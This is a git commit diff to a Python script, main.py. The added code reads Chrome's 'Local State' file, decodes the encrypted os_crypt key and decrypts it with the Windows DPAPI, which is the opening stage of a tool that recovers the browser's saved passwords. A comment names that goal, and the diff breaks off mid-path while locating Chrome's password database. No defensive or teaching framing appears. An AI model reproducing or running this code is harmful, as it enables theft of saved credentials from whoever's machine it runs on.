2c63f4f2d6e9f51f75c11311b6ce74cc7aea21f1
mr.mojtaba.2 <mr.mojtaba.mail@gmail.com>
2023-12-09 07:38:42 +0330

    second commit

--- main.py
+++ main.py
@@ -11,8 +11,16 @@ import win32crypt
 # Need to install ( pycryptodomex )
 from Cryptodome.Cipher import AES
 
+
+# To gaining the key
 file_path = os.environ["USERPROFILE"] + r"\AppData\Local\Google\Chrome\User Data\Local State"
 with open(file_path, "r", encoding="utf-8") as f:
     js_data = f.read()
     py_data = json.loads(js_data)
-print(py_data["os_crypt"]["encrypted_key"])
+
+encryption_key = base64.b64decode(py_data["os_crypt"]["encrypted_key"])[5:]
+
+key = win32crypt.CryptUnprotectData(encryption_key)[1]
+
+# To Gaining the saved passwords
+db_path = os.environ["USERPROFILE"] + r"\AppData\Local\Google\Chrome\User Data\De"
